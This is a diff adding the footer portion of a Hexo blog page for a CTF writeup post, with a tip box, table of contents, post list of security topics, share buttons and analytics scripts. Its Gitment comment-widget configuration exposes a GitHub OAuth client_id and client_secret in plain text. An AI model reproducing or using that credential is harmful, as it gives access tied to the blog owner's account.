+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/05/04/第二届ZJGSCTFWP/">第二届ZJGSCTFWP</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Err0rzz 的个人博客">Err0rzz</a></p>
+        <p><span>发布时间:</span>2018年05月04日 - 19时14分</p>
+        <p><span>最后更新:</span>2018年05月06日 - 22时40分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/05/04/第二届ZJGSCTFWP/" title="第二届ZJGSCTFWP">http://Err0rzz.github.io/2018/05/04/第二届ZJGSCTFWP/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2018/05/04/第二届ZJGSCTFWP/　　作者: Err0rzz" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2018/03/26/imagecreatefrom-sctf2016/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">imagecreatefrom_sctf2016</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#壮壮的网站"><span class="toc-number">1.1.</span> <span class="toc-text">壮壮的网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#奇淫技巧"><span class="toc-number">1.2.</span> <span class="toc-text">奇淫技巧</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#这是神魔鬼"><span class="toc-number">2.1.</span> <span class="toc-text">这是神魔鬼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#女神又来短信"><span class="toc-number">2.2.</span> <span class="toc-text">女神又来短信</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#壮壮可能是疯了"><span class="toc-number">2.3.</span> <span class="toc-text">壮壮可能是疯了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#我这么可爱"><span class="toc-number">2.4.</span> <span class="toc-text">我这么可爱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#贝斯家族永不言败"><span class="toc-number">2.5.</span> <span class="toc-text">贝斯家族永不言败</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA-is-so-easy"><span class="toc-number">2.6.</span> <span class="toc-text">RSA is so easy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CrazyRSA"><span class="toc-number">2.7.</span> <span class="toc-text">CrazyRSA</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'Err0rzz',
+      repo: 'Err0rzz.github.io',
+      oauth: {
+        client_id: 'd9c845fbbbb51d243003',
+        client_secret: 'b8310696d39906b802cc7f1f594f21501cb4e9d6',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2018/03/26/imagecreatefrom-sctf2016/" title="下一篇: imagecreatefrom_sctf2016">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/05/04/第二届ZJGSCTFWP/">第二届ZJGSCTFWP</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/imagecreatefrom-sctf2016/">imagecreatefrom_sctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/lfi-phpinfo/">lfi_phpinfo</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/12/提权/">提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/09/Ubuntu下Apache2开启-关闭模板方法/">Ubuntu下Apache2开启/关闭模板方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/Apache-HTTP-Server-后门开发/">Apache HTTP Server 后门开发</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/Kali2018更新问题/">Kali2018更新问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/01/SQL截断攻击/">SQL截断攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/26/UDF-mysql/">UDF--mysql</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/iptables的简单使用/">iptables的简单使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/20/docker基本操作/">docker基本操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/CSRF学习/">CSRF学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/11/第一届智商杯wp/">第一届智商杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/linux下的mysql使用/">linux下的mysql使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/Padding-Oracle-攻击/">Padding_Oracle 攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/爆破脚本/">爆破脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/OOB注入/">OOB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/sage安装/">sage安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/CTF中RSA套路/">CTF中RSA套路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/GET的命令执行漏洞/">GET的命令执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/13/ctf命令执行与绕过/">ctf命令执行与绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/无线破解浅谈/">无线破解浅谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/07/浅谈php安全/">浅谈php安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/08/Ubuntu安装Apache2-php7-mysql/">Ubuntu安装Apache2+php7+mysql</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/文件任意写入getshell/">文件任意写入getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/问鼎杯线上/">问鼎杯writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2018 Err0rzz
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+  
+  _st('install','AjANbx_Gvxi4Gqwsd6Kq','2.0.0');
+</script>
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 31;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
